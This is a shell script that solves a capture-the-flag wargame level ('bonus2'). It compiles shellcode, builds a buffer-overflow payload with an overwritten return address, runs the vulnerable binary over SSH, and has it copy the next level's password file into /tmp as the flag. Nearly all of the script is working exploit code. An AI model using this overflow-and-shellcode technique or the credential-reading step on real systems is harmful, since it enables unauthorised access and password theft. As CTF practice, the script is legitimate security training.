#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# ######### #
# SHELLCODE #
# ######### #

generate_shellcode() {
    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d);

    nasm -f elf32 "$CURR_DIR_PATH/data/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    unset tmpdir shellcode;
    return 0;
}

# #### #
# MAIN #
# #### #

main() {
    flag="";

    shellcode="$(generate_shellcode)" || { log "Error: failed to build shellcode."; return 1; };
    shellcode_addr='\300\375\377\277';

    user_input_1="$(printf '%b%s' "$shellcode" 'AAAAAAAAAAAAAAA')";
    user_input_2="$(printf '%b' 'BBBBBBBBBBBBBBBBBB\300\375\377\277')";
    env_lang='fi'

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket." >&2; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
    (
        printf '%s' 'cat '/home/user/bonus3/.pass' > /tmp/flag.txt;';
    ) | ssh_exec_via_socket "$host" "$port" "$username" "env -i LANG='$env_lang' ./bonus2 '$user_input_1' '$user_input_2'";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket." >&2; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    echo -n "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
